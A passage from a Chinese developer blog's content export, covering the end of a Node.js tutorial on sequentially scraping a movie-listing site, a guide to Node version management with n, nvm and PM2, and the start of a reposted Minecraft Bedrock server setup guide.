&#x27;2019年喜剧《白烂贱客2》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/13/753d9ea7958f8898fee58bca7418c815.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年科幻动作《终结者：黑暗命运》BD中英双字幕&#x27;, picture: undefined &#125;</span><br><span class="line">&#123; name: &#x27;2019年科幻喜剧《杰克茜/神机有毛病》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/15/20bd24aca384f8b65c2d9ffc6fd48787.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年惊悚恐怖《落头氏之吻》BD泰语中字&#x27;, picture: undefined &#125;</span><br><span class="line">&#123; name: &#x27;2019年获奖剧情《哈丽特/自由之火》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/18/5d5b14f0d53353a5caaebac0bca7eca9.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2015年高分悬疑剧情《误杀瞒天记》BD中字&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/16/109cb7e667131a9abec842384d109d5f.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年动作《敢死七镖客》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/25/8b4a82e47816c3e3bd4c2e56e5d222ef.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年剧情《谎言大师》BD中英双字幕&#x27;,</span><br><span class="line">  picture: &#x27;https://lookimg.com/images/2020/01/26/JMBaW.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年悬疑惊悚《布鲁克林秘案》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/14/0b32b640a9f84260655004012fe2502f.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2014年奇幻冒险《沉睡魔咒》BD国英双语双字&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/17/6d181b7104d0f8b7a0929c3138efe494.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年惊悚动作《快递员》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/14/35ded36c5d4f54887244f88539722b8a.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年动画喜剧《动物特工局》HD国语中字&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://www.z4a.net/images/2020/01/26/5f6998b3eaa19ba6f.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年惊悚恐怖奇幻《睡梦医生加长版》BD中英双字幕&#x27;,</span><br><span class="line">  picture: &#x27;https://lookimg.com/images/2020/01/24/JdkMq.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年喜剧《交友网战/爱程攻防战》BD泰语中字&#x27;, picture: undefined &#125;</span><br><span class="line">&#123; name: &#x27;2019年奇幻动作《阿比盖尔/魔法禁界》BD英语中字&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/08/92aca31fe6be93f2896d130be25a420b.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年动画喜剧《雪人奇缘》BD英国粤三语双字&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2019/12/01/8275cc39f94fa9eefb8d1bd451567f67.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年惊悚恐怖《倒忌时/索命倒数》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/12/3d1c934d4ab10c65a3ceed81635170c6.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2017年惊悚动作《全面营救》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/12/50722770f13638a0e6ac21379912fe6f.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年动作《疾速杀机》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/13/4fb382ac730377ed36acf3306ca90273.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年动作《洛城夜巡》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/13/bdc7f21d21409f6d9aa44d7d9fb5de10.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年动画喜剧《亚当斯一家》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/12/c78cf2a45898a8f2f19b5a8bda1d3726.jpg&#x27; &#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-大量数据抓取的优化"><a href="#2-3-大量数据抓取的优化" class="headerlink" title="2.3 大量数据抓取的优化"></a>2.3 大量数据抓取的优化</h2><p>如果我们想要抓取整个欧美专区的所有电影信息，就需要获取每个页面的 url，我们先对其进行收集，这里以抓取200页数据为例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> urlArr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">  urlArr.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;host&#125;</span>/html/gndy/oumei/list_7_<span class="subst">$&#123;i&#125;</span>.html`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(urlArr);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ </span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_0.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_1.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_2.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_3.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_4.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_5.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_6.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_7.html&#x27;,</span><br><span class="line">  &#x27;https://www.ygdy8.net/html/gndy/oumei/list_7_8.html&#x27;,</span><br><span class="line">  ... ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>如果我们再 for 循环中直接去执行文章 2.2 步骤中的 <code>getList()</code> 方法，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">  <span class="title function_">getList</span>(<span class="string">`<span class="subst">$&#123;host&#125;</span>/html/gndy/oumei/list_7_<span class="subst">$&#123;i&#125;</span>.html`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这就相当于同时异步访问 200*25 个 url，这对于资源有限的服务器来说压力是巨大的，因此我们要对其进行优化。</p><p>我们已知 <code>getList()</code> 方法会抓取电影列表的数据，然后再开启并发任务去抓取每个电影的详情，因此我们只要控制住 <code>getList()</code> 方法，不让其并发执行即可，因此我们会想到使用 <code>await</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">getList</span>(<span class="string">`<span class="subst">$&#123;host&#125;</span>/html/gndy/oumei/list_7_<span class="subst">$&#123;i&#125;</span>.html`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是再同步方法中是无法使用 <code>await</code> 的，那么有什么方法可以使用呢？如果创建一个异步方法，将 <code>for</code> 循环写入该异步方法中，然后再调用创建的异步方法可以解决，但是这样写并不优雅。我们采用另一种思路，使用 <code>Array.reduce()</code> 来创建异步方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> urlArr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  urlArr.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;host&#125;</span>/html/gndy/oumei/list_7_<span class="subst">$&#123;i&#125;</span>.html`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">urlArr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">rs, url</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> rs.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">async</span> resolve =&gt; &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">getList</span>(url);</span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, <span class="title class_">Promise</span>.<span class="title function_">resolve</span>());</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> urlArr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  urlArr.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;host&#125;</span>/html/gndy/oumei/list_7_<span class="subst">$&#123;i&#125;</span>.html`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">urlArr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">rs, url</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> rs.<span class="title function_">then</span>(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">getList</span>(url);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, <span class="title class_">Promise</span>.<span class="title function_">resolve</span>());</span><br></pre></td></tr></table></figure><p>其原理实际上都是利用 <code>reduce()</code> 方法创建了多个异步方法，并且使用 <code>await</code> 去等待异步方法的执行，这样我们就可以更好的限制同时发出的并发请求数量。</p><p><code>Array.reduce(callback, initialValue)</code> 的参数详情如下：</p><p><code>callback</code></p><p>执行数组中每个值 (如果没有提供 <code>initialValue则第一个值除外</code>)的函数，包含四个参数：</p><ul><li><p><strong><code>accumulator</code></strong></p><p>累计器累计回调的返回值; 它是上一次调用回调时返回的累积值，或<code>initialValue</code>（见于下方）。</p></li><li><p><code>currentValue</code></p><p>数组中正在处理的元素。</p></li><li><p><code>index</code> 可选</p><p>数组中正在处理的当前元素的索引。 如果提供了<code>initialValue</code>，则起始索引号为0，否则从索引1起始。</p></li><li><p><code>array</code>可选</p><p>调用<code>reduce()</code>的数组</p></li></ul><p><code>initialValue</code>可选</p><p>作为第一次调用 <code>callback</code>函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node应用服务器部署与多版本管理指南</title>
      <link href="/2020/01/7dea0b18aba8.html"/>
      <url>/2020/01/7dea0b18aba8.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-使用-n-与-nvm-管理-node-版本"><a href="#1-使用-n-与-nvm-管理-node-版本" class="headerlink" title="1. 使用 n 与 nvm 管理 node 版本"></a>1. 使用 n 与 nvm 管理 node 版本</h1><h2 id="1-1-n"><a href="#1-1-n" class="headerlink" title="1.1 n"></a>1.1 n</h2><p>n 是一个需要全局安装的 npm package。</p><p>这意味着，我们在使用 n 管理 node 版本前，首先需要一个 node 环境。我们或者用 Homebrew 来安装一个 node，或者从官网下载 pkg 来安装，总之我们得先自己装一个 node —— n 本身是没法给你装的。</p><p>然后我们可以使用 n 来安装不同版本的 node。</p><p>在安装的时候，n 会先将指定版本的 node 存储下来，然后将其复制到我们熟知的路径 <code>/usr/local/bin</code>，非常简单明了。当然由于 n 会操作到非用户目录，所以需要加 <code>sudo</code> 来执行命令。</p><p>所以这样看来，n 在其实现上是一个非常易理解的方案。</p><blockquote><p>引用：<a href="https://fed.taobao.org/blog/taofed/do71ct/nvm-or-n/?spm=taofed.homepage.header.7.7eab5ac8a3p43I">https://fed.taobao.org/blog/taofed/do71ct/nvm-or-n/?spm=taofed.homepage.header.7.7eab5ac8a3p43I</a></p></blockquote><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g n</span><br></pre></td></tr></table></figure><p>下载完成后就可以使用 <code>n</code> 来安装指定版本的 node：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ n 版本号</span><br></pre></td></tr></table></figure><p>下载最新版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ n latest</span><br></pre></td></tr></table></figure><p>删除某个版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ n <span class="built_in">rm</span> 4.4.4</span><br></pre></td></tr></table></figure><p>查看当前 node 版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>切换版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ n</span><br><span class="line"></span><br><span class="line">  6.9.4</span><br><span class="line">ο 7.4.0</span><br><span class="line">  4.4.4</span><br></pre></td></tr></table></figure><p>以指定的版本来执行脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ n use 7.4.0 index.js</span><br></pre></td></tr></table></figure><p>获取某个 node 版本的 bin 文件目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ n bin 8.17.0</span><br></pre></td></tr></table></figure><h2 id="1-2-nvm"><a href="#1-2-nvm" class="headerlink" title="1.2 nvm"></a>1.2 nvm</h2><p>不同于 n，nvm 不是一个 npm package，而是一个独立软件包。</p><p>我们可以使用 nvm 来安装不同版本的 node。</p><p>在安装的时候，nvm 将不同的 node 版本存储到 <code>~/.nvm/&lt;version&gt;/</code> 下，然后修改 <code>$PATH</code>，将指定版本的 node 路径加入，这样我们调用的 <code>node</code> 命令即是使用指定版本的 node。</p><p>nvm 显然比 n 要复杂一些，但是另一方面，由于它是一个独立软件包，因此它和 node 之间的关系看上去更合乎逻辑：nvm 不依赖 node 环境，是 node 依赖 nvm；而不像 n 那样产生类似循环依赖的问题。</p><p>同时由于 nvm 是通过修改系统 PATH 来切换全局的 node 版本，因此如果系统使用了 nvm 来管理 node 版本，n 的管理就会失效。</p><p>nvm 基础指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nvm -h //查看nvm的指令</span><br><span class="line">$ nvm list //查看本地已经安装的node版本列表</span><br><span class="line">$ nvm list available //查看可以安装的node版本</span><br><span class="line">$ nvm install latest //安装最新版本的node</span><br><span class="line">$ nvm install [version][<span class="built_in">arch</span>] //安装指定版本的node 例如：nvm install 10.16.3 安装node v10.16.3 <span class="built_in">arch</span>表示电脑的位数 如果电脑需要安装32位的， 则运行：nvm install 10.16.3 32</span><br><span class="line">$ nvm use [version] //使用node 例如：nvm use 10.16.3</span><br><span class="line">$ nvm uninstall [version] //卸载node</span><br></pre></td></tr></table></figure><p><code>nvm use</code> 仅能指定当前的 node 版本，并不能将其指定为默认的 node 版本，可以通过以下方法设置默认的 node 版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm <span class="built_in">alias</span> default v13.7.0</span><br></pre></td></tr></table></figure><h1 id="2-PM2-管理-node-应用"><a href="#2-PM2-管理-node-应用" class="headerlink" title="2. PM2 管理 node 应用"></a>2. PM2 管理 node 应用</h1><p>pm2（process manager）是一个进程管理工具，维护一个进程列表，可以用它来管理你的node进程，负责所有正在运行的进程，并查看node进程的状态，也支持性能监控，负载均衡等功能。</p><p>使用pm2管理的node程序的好处：</p><ul><li>监听文件变化，自动重启程序</li><li>支持性能监控</li><li>负载均衡</li><li>程序崩溃自动重启</li><li>服务器重新启动时自动重新启动</li><li>自动化部署项目</li></ul><h2 id="2-1-PM2-基础使用"><a href="#2-1-PM2-基础使用" class="headerlink" title="2.1 PM2 基础使用"></a>2.1 PM2 基础使用</h2><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install pm2 -g </span><br></pre></td></tr></table></figure><p>启动一个node程序: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start start.js --name test-app</span><br></pre></td></tr></table></figure><p>查看运行列表：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 list </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/30/o8N1qWATgluyaE4.png" alt=""></p><p>删除进程:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// pm2 delete [appname] | <span class="built_in">id</span></span><br><span class="line">pm2 delete app  // 指定进程名删除</span><br><span class="line">pm2 delete 0    // 指定进程<span class="built_in">id</span>删除</span><br><span class="line">pm2 delete all</span><br></pre></td></tr></table></figure><p>查看某个进程具体情况: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 describe app</span><br></pre></td></tr></table></figure><p>查看进程的资源消耗情况: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 monit</span><br></pre></td></tr></table></figure><p>重启进程：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 restart app // 重启指定名称的进程</span><br><span class="line">$ pm2 restart all // 重启所有进程</span><br></pre></td></tr></table></figure><p>设置pm2开机自启：</p><p>开启启动设置，此处是CentOS系统，其他系统替换最后一个选项（可选项：ubuntu, centos, redhat, gentoo, systemd, darwin, amazon）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 startup centos </span><br></pre></td></tr></table></figure><p>保存设置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 save</span><br></pre></td></tr></table></figure><h2 id="2-2-PM2-指定不同的-node-版本"><a href="#2-2-PM2-指定不同的-node-版本" class="headerlink" title="2.2 PM2 指定不同的 node 版本"></a>2.2 PM2 指定不同的 node 版本</h2><p>pm2 指令有一个选项为 <code>--interpreter</code> ，可以通过该选项指定 node 的位置，配合 n 模块的 <code>n bin [node-version]</code> 指令可以来获取不同版本 node 的路径：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 -f start index.js --interpreter `n bin 8.17.0`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> pm2 </tag>
            
            <tag> nvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Minecraft服务器搭建教程（转载）</title>
      <link href="/2020/01/45fc5ccecdaf.html"/>
      <url>/2020/01/45fc5ccecdaf.html</url>
      
        <content type="html"><![CDATA[<p>没想到新站搭好这么久没写东西，第一篇居然是这水货。本来没什么好写的，但是官网上说明简直太少了，坑死人，写这篇白话教程就当顺便吐槽吧。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote><p>官方服务端下载页面：<a href="https://minecraft.net/zh-hans/download/server/bedrock/">https://minecraft.net/zh-hans/download/server/bedrock/</a></p><p>直链：</p><p>Windows：<a href="https://minecraft.azureedge.net/bin-win/bedrock-server-1.8.0.24.zip">https://minecraft.azureedge.net/bin-win/bedrock-server-1.8.0.24.zip</a></p><p>Linux：<a href="https://minecraft.azureedge.net/bin-linux/bedrock-server-1.8.0.24.zip">https://minecraft.azureedge.net/bin-linux/bedrock-server-1.8.0.24.zip</a></p><p>内容来自Minecraft官网</p></blockquote><h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5><p>官方提供的服务端仅仅支持新版（测试18.04 LTS 正常）的Ubuntu服务器（其他发行版到现在为止试了这么多没一个跑起来的，，，打包的时候都不考虑一下兼容性么），注意国内大量云服务厂商包括阿里云在内都提供的是16.04版本的Ubuntu，如果直接安装将无法运行。</p><p>以阿里云为例，购买时选择安装Ubuntu 16.04 LTS 的系统镜像，登陆后执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install update-manager-core</span><br><span class="line">sudo do-release-upgrade</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后注意跟随屏幕上的提示进行更新，所有的包都要选择更新，否则套件版本过低会导致服务端程序无法运行（再次吐槽什么辣鸡兼容性）。更新过程根据服务器性能不同会进行几分钟到几十分钟不等，期间会经常需要确认，不能点了更新就跑。</p><p>更新完成以后就直接下载安装。首先新建个文件夹并进入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir mc</span><br><span class="line">cd ./mc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下载并解压服务端程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://minecraft.azureedge.net/bin-win/bedrock-server-1.8.0.24.zip</span><br><span class="line">unzip bedrock-server-1.8.0.24.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果第二条命令没法执行就需要安装一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install unzip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解压好以后可以用ls查看一下文件，只要多出来一大堆文件应该就没问题了。这时候安装已经完成了，但是还需要进一步的配置才能运行。</p><h5 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h5><p>Windows就不细说了，下载下来点开就行。我在我的Windows 10 上可以正常运行但是Win server 2012 （R2，貌似）上怎么折腾也不行，能安装的环境都安装了，缺的dll也补齐了，但是依旧报无法运行。跑起来的大佬可以解释一下什么鬼情况。反正接续吐槽辣鸡兼容性就对了。<strong>教程的后半部分也不会继续再说Windows，所有操作都是在Linux上进行的。</strong>在Windows上运行的话类比即可。</p><h3 id="配置服务端软件"><a href="#配置服务端软件" class="headerlink" title="配置服务端软件"></a>配置服务端软件</h3><p>首先编辑server.properties（vi是Linux上常用的一个文本编辑工具，不会用的话自行百度，也就几个常用命令就能学会，再在这里教vi的话，，，你想累死我啊233333）。下面有文件的内容，<del>一些重要或者常用的部分</del>我用中文加了注释（好吧，一不小心都加了中文注释）（英文注释是最详细的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi server.properties</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#server.properties：<br>server-name=Dedicated Server<br># 服务器名称<br># Used as the server name<br># Allowed values: Any string</p><p>gamemode=survival<br># 游戏模式（生存/创造/冒险）<br># Sets the game mode for new players.<br># Allowed values: “survival”, “creative”, or “adventure”</p><p>difficulty=easy<br># 难度<br># Sets the difficulty of the world.<br># Allowed values: “peaceful”, “easy”, “normal”, or “hard”</p><p>allow-cheats=false<br># 是否允许作弊<br># If true then cheats like commands can be used.<br># Allowed values: “true” or “false”</p><p>max-players=10<br># 最大玩家数<br># The maximum number of players that can play on the server.<br># Allowed values: Any positive integer</p><p>online-mode=true<br># 是否在线验证（验证Xbox账号，要是不存在网络问题就开着吧）<br># If true then all connected players must be authenticated to Xbox Live.<br># Clients connecting to remote (non-LAN) servers will always require Xbox Live authentication regardless of this setting.<br># If the server accepts connections from the Internet, then it’s highly recommended to enable online-mode.<br># Allowed values: “true” or “false”</p><p>white-list=false<br># 是否开启白名单<br># If true then all connected players must be listed in the separate whitelist.json file.<br># Allowed values: “true” or “false”</p><p>server-port=19132<br># IPv4 端口，没特殊情况默认就好<br># Which IPv4 port the server should listen to.<br># Allowed values: Integers in the range [1, 65535]</p><p>server-portv6=19133<br># IPv6 端口，没特殊情况默认就好<br># Which IPv6 port the server should listen to.<br># Allowed values: Integers in the range [1, 65535]</p><p>view-distance=32<br># 视野大小（区块）（开太大会加重服务器开销）<br># The maximum allowed view distance in number of chunks.<br># Allowed values: Any positive integer.</p><p>tick-distance=4<br># 玩家附近加载区块范围（只有加载区块里面的实体/电路/植物等等会被刷新）（一样，开多了会卡）<br># The world will be ticked this many chunks away from any player.<br># Allowed values: Integers in the range [4, 12]</p><p>player-idle-timeout=30<br># 超时时间（超过这个时间不操作的玩家会被踢掉），单位是分钟。<br># After a player has idled for this many minutes they will be kicked. If set to 0 then players can idle indefinitely.<br># Allowed values: Any non-negative integer.</p><p>max-threads=8<br># 最大线程<br># Maximum number of threads the server will try to use. If set to 0 or removed then it will use as many as possible.<br># Allowed values: Any positive integer.</p><p>level-name=Bedrock level<br># 世界名称<br># Allowed values: Any string</p><p>level-seed=<br># 世界种子<br># Use to randomize the world<br># Allowed values: Any string</p><p>default-player-permission-level=member<br># 默认权限<br># Permission level for new players joining for the first time.<br># Allowed values: “visitor”, “member”, “operator”</p><p>texturepack-required=false<br># 强制加载材质包<br># Force clients to use texture packs in the current world<br># Allowed values: “true” or “false”</p><p>配置好以后保存（:wq），然后就可以启动服务器试试啦：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_LIBRARY_PATH=. ./bedrock_server</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NO LOG FILE! - setting up server logging...</span><br><span class="line">NO LOG FILE! - [2018-12-27 13:18:58 INFO] Starting Server</span><br><span class="line">NO LOG FILE! - [2018-12-27 13:18:58 INFO] Version 1.8.0.24</span><br><span class="line">[2018-12-27 13:18:58 INFO] Level Name: mc</span><br><span 